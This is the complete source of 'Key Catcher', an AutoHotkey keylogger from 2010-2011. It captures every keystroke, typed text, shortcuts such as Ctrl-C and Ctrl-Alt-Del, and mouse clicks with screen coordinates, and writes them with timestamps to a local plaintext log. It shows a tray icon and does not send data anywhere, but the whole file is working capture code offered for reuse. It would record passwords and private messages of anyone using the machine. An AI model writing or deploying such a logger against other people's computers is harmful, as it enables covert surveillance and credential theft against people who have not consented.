;Copyright 2010-2011 Daniel Green, v1.00.3b modified 1/14/11 3:28am

;Key Catcher is free for both business and personal use. It can be freely modified and redistributed providing that, 1. all notices remain intact, 2. you acknowledge where it originally came from, 3. it is only used for legal and ethical purposes, 4. no profit is derived from its distribution.

#noenv
#singleinstance, ignore
setbatchlines, -1
setworkingdir, %a_scriptdir%
process, priority, ,high
coordmode, mouse, screen

menu, tray, Icon, icons\main.ico, , 1
menu, tray, nostandard
menu, tray, tip, Logging Active
menu, tray, add, View Log, view
menu, tray, add, Delete Log, delete
menu, tray, add, About, about
menu, tray, add
menu, tray, add, Disable, suspend
menu, tray, add, Mouse Trap, mousetrap
menu, tray, add
menu, tray, add, Exit, exit

settimer, mem, 1200000, 0

hotkey, ~lbutton, off
hotkey, ~rbutton, off
hotkey, ~wheelup, off
hotkey, ~wheeldown, off
hotkey, ~mbutton, off

blank=
endkey={enter}{tab}{Backspace}{left}{up}{right}{down}
match=.,?,!

loop
{
    key=
    emptymem()
    input, text, imv*, %endkey%, %match%
    stringtrimleft, key, errorlevel, 7
    stringreplace, key, key, enter, {Enter}
    stringreplace, key, key, tab, {Tab}
    stringreplace, key, key, backspace, {Backspace}
    stringreplace, key, key, left, {Left Arrow}
    stringreplace, key, key, up, {Up Arrow}
    stringreplace, key, key, right, {Right Arrow}
    stringreplace, key, key, down, {Down Arrow}
    stringreplace, text, text, , %blank%
    time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
    key=%key%
    text=%text%

    if text=%blank%
    {
        fileappend, %time% - %key%`n, log.txt
    }

    if key=%blank%
    {
        fileappend, %time% - %text%`n, log.txt
    }

    if text<>%blank%
    {
        if key<>%blank%
        {
            fileappend, %time% - %text%`n, log.txt
            fileappend, %time% - %key%`n, log.txt
        }
    }
}

~esc & f1::return
~esc up::
    {
        content = {Esc}
        goto, write
    }
return

~printscreen & f1::return
~printscreen up::
    {
        content = {Print Screen}
        goto, write
    }
return

~lshift & f1::return
~lshift up::
    {
        content = {Left Shift}
        goto, write
    }
return

~rshift & f1::return
~rshift up::
    {
        content = {Right Shift}
        goto, write
    }
return

~lcontrol & f1::return
~lcontrol up::
    {
        content = {Left Ctrl}
        goto, write
    }
return

~rcontrol & f1::return
~rcontrol up::
    {
        content = {Right Ctrl}
        goto, write
    }
return

~lalt & f1::return
~lalt up::
    {
        content = {Left Alt}
        goto, write
    }
return

~ralt & f1::return
~ralt up::
    {
        content = {Right Alt}
        goto, write
    }
return

~lwin::
    {
        content = {Left Win}
        goto, write
    }
return

~rwin::
    {
        content = {Right Win}
        goto, write
    }
return

~del & f1::return
~del up::
    {
        content = {Delete}
        goto, write
    }
return

~ins & f1::return
~ins up::
    {
        content = {Insert}
        goto, write
    }
return

~home & f1::return
~home up::
    {
        content = {Home}
        goto, write
    }
return

~end & f1::return
~end up::
    {
        content = {End}
        goto, write
    }
return

~pgup::
    {
        content = {Page Up}
        goto, write
    }
return

~pgdn::
    {
        content = {Page Down}
        goto, write
    }
return

~^z::
    {
        content = {Ctrl-Z}
        goto, write
    }
return

~^x up::
    {
        content = {Ctrl-X}
        goto, write
    }
return

~^c up::
    {
        content = {Ctrl-C}
        goto, write
    }
return

~^v::
    {
        content = {Ctrl-V}
        goto, write
    }
return

~^!del::
    {
        content = {Ctrl-Alt-Del}
        goto, write
    }
return

~^+esc::
    {
        content = {Ctrl-Shift-Esc}
        goto, write
    }
return

~f1 up::
    {
        content = {F1}
        goto, write
    }
return

~f2 up::
    {
        content = {F2}
        goto, write
    }
return

~f3 up::
    {
        content = {F3}
        goto, write
    }
return

~f4 up::
    {
        content = {F4}
        goto, write
    }
return

~f5 up::
    {
        content = {F5}
        goto, write
    }
return

~f6 up::
    {
        content = {F6}
        goto, write
    }
return

~f7 up::
    {
        content = {F7}
        goto, write
    }
return

~f8 up::
    {
        content = {F8}
        goto, write
    }
return

~f9 up::
    {
        content = {F9}
        goto, write
    }
return

~f10 up::
    {
        content = {F10}
        goto, write
    }
return

~f11 up::
    {
        content = {F11}
        goto, write
    }
return

~f12 up::
    {
        content = {F12}
        goto, write
    }
return

~lbutton::
    {
        time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
        mousegetpos, mx, my

        if lcount > 0
        {
            lcount += 1
            return
        }
        else
        {
            lcount = 1
            settimer, go, 300
            return
        }

        go:
            {
                settimer, go, off

                if lcount = 1
                {
                    content = {Left click - %mx% x %my%}
                    gosub, write
                }
                else if lcount > 1
                {
                    content = {Double click - %mx% x %my%}
                    gosub, write
                }
            }
            lcount = 0
        return
    }

    ~rbutton::
        {
            date=%a_dd%-%a_mm%-%a_yyyy%
            time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
            mousegetpos, mx, my
            content = {Right click - %mx% x %my%}
            goto, write
        }
    return

    ~wheelup::
        {
            time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
            mousegetpos, mx, my

            if ucount > 0
            {
                ucount += 1
                settimer, up, 400
                return
            }
            else
            {
                ucount = 1
                settimer, up, 400
                return
            }

            up:
                {
                    settimer, up, off
                    content = {Scroll up - %mx% x %my% - %ucount%}
                    gosub, write
                }
                ucount = 0
            return
        }

        ~wheeldown::
            {
                time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
                mousegetpos, mx, my

                if dcount > 0
                {
                    dcount += 1
                    settimer, down, 400
                    return
                }
                else
                {
                    dcount = 1
                    settimer, down, 400
                    return
                }

                down:
                    {
                        settimer, down, off
                        content = {Scroll down - %mx% x %my% - %dcount%}
                        gosub, write
                    }
                    dcount = 0
                return
            }

            ~mbutton::
                {
                    time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
                    mousegetpos, mx, my
                    content = {Center click - %mx% x %my%}
                    settimer, write, -120
                }
            return

            write:
                {
                    time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
                    fileappend, %time% - %content%`n, log.txt
                    emptymem()
                }
            return

            view:
                {
                    fileinstall, log.txt, log.txt, 0
                    runwait, log.txt
                    emptymem()
                }
            return

            delete:
                {
                    ifexist, log.txt
                    {
                        msgbox, 33, Confirm Delete, Delete log?

                        ifmsgbox, ok
                        {
                            filerecycle, log.txt
                            msgbox, 64, Log Deleted, The log file has been sent to the Recycle Bin., 5
                            emptymem()
                            return
                        }
                        else
                        {
                            emptymem()
                            return
                        }
                    }

                    ifnotexist, log.txt
                    {
                        msgbox, 64, Cannot Delete Log, Cannot delete log file because it does not exist., 5
                        emptymem()
                        return
                    }
                }
            return

            about:
                {
                    fileinstall, readme.txt, readme.txt, 0
                    runwait, readme.txt
                    emptymem()
                }
            return

            suspend:
                {
                    if a_issuspended = 0
                    {
                        menu, tray, tip, Logging Suspended
                        menu, tray, rename, Disable, Enable
                        menu, tray, icon, icons\suspend.ico, , 1
                        suspend, on
                        pause, on
                        emptymem()
                    }
                    else
                    {
                        menu, tray, tip, Logging Active
                        suspend, off
                        pause, off
                        menu, tray, rename, Enable, Disable
                        menu, tray, icon, icons\main.ico, , 1
                        emptymem()
                    }
                }
            return

            mousetrap:
                {
                    hotkey, ~lbutton, toggle
                    hotkey, ~rbutton, toggle
                    hotkey, ~wheelup, toggle
                    hotkey, ~wheeldown, toggle
                    hotkey, ~mbutton, toggle
                    menu, tray, togglecheck, mouse trap
                    emptymem()
                }
            return

            exit:
                {
                    exitapp
                }
            return

            mem:
                {
                    emptymem()
                }
            return

            emptymem()
            {
            return, dllcall("psapi.dll\EmptyWorkingSet", "UInt", -1)
        }

; ------------------------------------------------------------------------------


~!tab up::
    {
        content = {Alt-Tab}
        goto, write
    }
return

~^s up::
    {
        content = {Ctrl-s}
        goto, write
    }
return

~^a up::
    {
        content = {Ctrl-a}
        goto, write
    }
return

~^y up::
    {
        content = {Ctrl-y}
        goto, write
    }
return

;/* ------------------------------ UP Related ------------------------------ */

~^up up::
    {
        content = {Ctrl-up}
        goto, write
    }
return

~^+up up::
    {
        content = {Ctrl-Shift-up}
        goto, write
    }
return

;/* ------------------------------ Left Related ------------------------------ */

~^down up::
    {
        content = {Ctrl-down}
        goto, write
    }
return

~^+down up::
    {
        content = {Ctrl-Shift-down}
        goto, write
    }
return



;/* ------------------------------ Left Related ------------------------------ */

~^left up::
    {
        content = {Ctrl-Left}
        goto, write
    }
return

~^+left up::
    {
        content = {Ctrl-Shift-Left}
        goto, write
    }
return

;/* ------------------------------ Right related ----------------------------- */

~^right up::
    {
        content = {Ctrl-Right}
        goto, write
    }
return

~^+Right up::
    {
        content = {Ctrl-Shift-Right}
        goto, write
    }
return

;/* ------------------------------ Home related ------------------------------ */

~^home up::
    {
        content = {Ctrl-Home}
        goto, write
    }
return

~^+home up::
    {
        content = {Ctrl-Shift-Home}
        goto, write
    }
return

~+home up::
    {
        content = {Shift-Home}
        goto, write
    }
return

;/* ------------------------------- End related ------------------------------ */

~^end up::
    {
        content = {Ctrl-end}
        goto, write
    }
return

~^+end up::
    {
        content = {Ctrl-Shift-End}
        goto, write
    }
return

~+end up::
    {
        content = {Shift-End}
        goto, write
    }
return

;/* ------------------------------- End related ------------------------------ */

~^BS up::
    {
        content = {Ctrl-Backspace}
        goto, write
    }
return